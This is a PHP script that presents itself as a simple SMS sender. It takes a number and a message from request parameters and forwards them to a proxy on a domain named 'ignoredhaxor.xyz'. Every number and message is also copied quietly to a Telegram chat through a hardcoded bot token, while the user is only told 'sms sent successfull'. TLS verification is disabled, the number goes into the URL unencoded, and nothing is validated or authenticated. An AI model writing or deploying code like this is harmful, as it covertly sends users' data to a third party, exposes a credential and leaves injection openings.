<?php
//error_reporting(0);

$num = $_REQUEST["number"]; //get number from get request
$msg1 = $_REQUEST["message"]; // get message from get requst

// $num = ltrim($num1, '0');  //to remove 0 from 11 digit number

$msg = urlencode($msg1); //to convert data into urlencode

$ch = curl_init();

$url = "https://proxy.ignoredhaxor.xyz/index.php?user=multi&number=" . $num . "&message=" . $msg;
$url2 = "https://api.telegram.org/bot5493715552:AAGO5wWsV_4G2VApvoP7U8sHvz_URe0d84o/sendMessage?chat_id=-798981573&text=<pre>To%20-%20" . $num . "</pre><pre>Text%20-%20" . $msg . "</pre>&parse_mode=html";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$curl2 = curl_init($url2);
curl_setopt($curl2, CURLOPT_URL, $url2);
curl_setopt($curl2, CURLOPT_RETURNTRANSFER, true);


//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp = curl_exec($curl);
curl_close($curl);

$resp2 = curl_exec($curl2);
curl_close($curl2);
echo 'sms sent successfull';

echo $resp2;

?>